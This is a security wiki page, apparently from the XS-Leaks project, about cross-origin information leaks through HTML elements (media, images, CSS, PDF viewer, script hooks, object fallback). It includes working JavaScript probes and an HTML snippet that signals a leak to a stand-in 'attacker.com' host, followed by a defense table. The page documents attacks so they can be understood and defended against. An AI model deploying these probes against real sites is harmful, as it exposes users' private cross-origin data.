+++
title = "Element leaks"
description = ""
category = "Attack"
abuse = [
    "HTMLElement",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

Some HTML Elements might be used to leak a portion of data to a cross-origin page.
For example, the below media resources can leak information about its size, duration, type. 

- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) leaks the media `duration` and the `buffered` times. [Run demo](https://xsinator.com/testing.html#Media%20Duration%20Leak)
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) leaks the `videoHeight` and `videoWidth` 
  some browsers may also have `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` and `webkitDecodedFrameCount`
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) leaks the `totalVideoFrames`.
- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) leaks the `height` and `width` but if the image is invalid they will be 0 
  and [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) will get rejected. [Run demo](https://xsinator.com/testing.html#Media%20Dimensions%20Leak)

It's possible to differentiate between media types via unique property for a given media type. For example, it is `videoWidth` for a `<video>`, or `duration` for an `<audio>`. The below snippet shows an example code that returns the type of a resource. 
```javascript
async function getType(url) {
    // Detect if resource is audio or video
    let media = document.createElement("video");
    media.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (media.videoWidth) {
    return "video";
    } else if (media.duration) {
    return "audio"
    }
    // Detect if resource is an image
    let image = new Image();
    image.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (image.width) return "image";
}
```

## Abusing CORB
[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes responses empty if the wrong content type is used.
This means that if the type is wrong it’s not cached.
An `ifCached` function can be found in [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}}) article.
```javascript
async function isType(url, type = "script") {
  let error = false;
  // Purge url
  await ifCached(url, true);
  // Attempt to load resource
  let e = document.createElement(type);
  e.onerror = () => error = true;
  e.src = url;
  document.head.appendChild(e);
  // Wait for it to be cached if its allowed by CORB
  await new Promise(resolve => setTimeout(resolve, 500));
  // Cleanup
  document.head.removeChild(e);
  // Fix for "images" that get blocked differently.
  if (error) return false
  return ifCached(url);
}
```

## Abusing getComputedStyle
[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to read an embedded to the current page CSS style sheets. Including those loaded from different origins. 
This function just checks if there has been a style applied to the body. [Run demo](https://xsinator.com/testing.html#CSS%20Property%20Leak)
```javascript
async function isCSS(url) {
    let link = document.createElement('link');
    link.rel = 'stylesheet';
    link.type = 'text/css';
    link.href = url;
    let style1 = JSON.stringify(getComputedStyle(document.body));
    document.head.appendChild(link);
    await new Promise(resolve => setTimeout(resolve, 500));
    let style2 = JSON.stringify(getComputedStyle(document.body));
    document.head.removeChild(link);
    return (style1 !== style2);
}
```
## PDF
There are [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar`, `nameddest`. Firefox has also implemented `search`.
For Chrome, a PDF can be detected with [Frame Counting]({{< ref "/docs/attacks/frame-counting.md" >}}) because the document is internally embedded into a page.
Chrome also implements the PDF scripting API that can be used to confirm if the frame is a pdf. [^pdf-api]
```javascript
async function isPDF(URL) {
    // Open to target
    let iframe = document.createElement('iframe');
    iframe.src = URL;
    document.body.appendChild(iframe);
    // Wait about 1.5 secounds to let the page load.
    await new Promise(resolve => setTimeout(resolve, 1500));
    // For Chrome a window opened to a pdf will always be 1.
    if (iframe.contentWindow.length !== 1) return false;
    let pdf;
    window.addEventListener("message", e => {
        // Detect if received a message from the Chrome PDF viewer.
        if (e.origin === 'chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai') pdf = true;
    });
    // Needed to start getting messages from the Chrome PDF viewer.
    iframe.contentWindow[0].postMessage("initialize", "*");
    // Wait for response from the Chrome PDF viewer.
    await new Promise(resolve => setTimeout(resolve, 1500));
    return pdf;
}
```
It’s also possible to abuse this API to send actions like `getSelectedText`, `selectAll`, `print`, `getThumbnail`, which potentially can leak information about the document's contents. 

```javascript
let w = open(URL);
w[0].postMessage({type: 'print'}, "*");
```
{{< hint info >}}
The above techniques doesn't seem to work in Firefox.
{{< /hint >}}

As a protection against leaking document's content cross-origin, the responses are limited to `documentLoaded` and `passwordPrompted` for cross-origin requests. 

## Script tag
When a cross-origin script is included on a page it's not directly possible to read its contents. However, if a script uses any built-in functions, it's possible to overwrite them and read their arguments which might leak valuable information [^script-leaks].
```javascript
let hook = window.Array.prototype.push;
window.Array.prototype.push = function() {
    console.log(this);
    return hook.apply(this, arguments);
}
```

## When Javascript can’t be used
If JavaScript is disabled it's still possible to leak some information about cross-origin resources. For example, an `<object>` can be used to detect whether a resource responds with *Error Code*. What happens is that if a resource `//example.org/resource` returns an error in `<object data=//example.org/resource>fallback</object>` then `fallback` will be rendered [^fallback] [^leaky-images]. It's possible to inject another `<object>` inside that will leak the information to an outside server, or detect it with CSS [^xsleaks-nojs].
The below code embeds `//example.org/404` and if it responds with *Error* then a request to `//attacker.com/?error` is also made as a fallback.
```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

## Defense

| Attack Alternative | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :----------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|     Type leaks     |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
## References
[^script-leaks]: The Unexpected Dangers of Dynamic JavaScript. [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)   
[^fallback]: HTML Standard, [3.2.5.2.6 Embedded content], [link](https://html.spec.whatwg.org/multipage/dom.html#fallback-content)  
[^leaky-images]: Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], [link](https://www.usenix.org/system/files/sec19-staicu.pdf)  
[^xsleaks-nojs]: [https://twitter.com/terjanq/status/1180477124861407234](https://twitter.com/terjanq/status/1180477124861407234)  
[^pdf-api]: pdf_viewer.ts, [link](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/resources/pdf/pdf_viewer.ts)  
